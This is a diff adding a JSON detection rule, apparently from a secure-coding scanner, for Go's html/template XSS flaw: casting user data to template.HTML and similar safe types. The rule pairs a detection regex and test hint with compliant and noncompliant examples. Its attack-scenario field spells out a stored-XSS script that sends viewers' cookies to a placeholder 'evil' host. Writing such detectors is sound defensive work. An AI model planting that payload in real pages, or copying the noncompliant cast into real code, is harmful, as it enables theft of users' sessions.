@@ -1,0 +1,35 @@
+{
+  "cwe_id": "CWE-79",
+  "name": "html/template safe-type cast on user data (XSS)",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "template",
+    "render",
+    "html",
+    "bio",
+    "comment",
+    "profile",
+    "markdown",
+    "email body",
+    "dashboard",
+    "web page",
+    "handler"
+  ],
+  "patterns": [
+    {
+      "lang": "go",
+      "confidence": "high",
+      "re": "\\btemplate\\.(?:HTML|JS|CSS|URL|HTMLAttr|Srcset|JSStr)\\(\\s*[A-Za-z_]", "reject_re": "(?i)sanitize|bluemonday|htmlescape|template\\.HTMLEscape"
+    }
+  ],
+  "attack_scenario": "Attacker stores <script>fetch('//evil/?c='+document.cookie)</script> in their profile bio; because the value was wrapped in template.HTML it is emitted verbatim and runs in every viewer's session, exfiltrating cookies.",
+  "negative_test_hint": [
+    "store bio = \"<script>alert(1)</script>\" and assert the rendered page HTML-escapes it instead of emitting it verbatim"
+  ],
+  "exemplar": {
+    "noncompliant": "data.Body = template.HTML(userComment)   // handed straight to {{.Body}}",
+    "compliant": "data.Body = userComment   // plain string; html/template auto-escapes it at {{.Body}}",
+    "explanation": "The template.HTML/JS/CSS/URL/HTMLAttr/Srcset/JSStr types tell html/template 'this is already safe, do not escape.' Casting a variable to one of them disables the exact auto-escaping that makes html/template safe; leaving user data as a plain string keeps the escaping intact."
+  }
+}
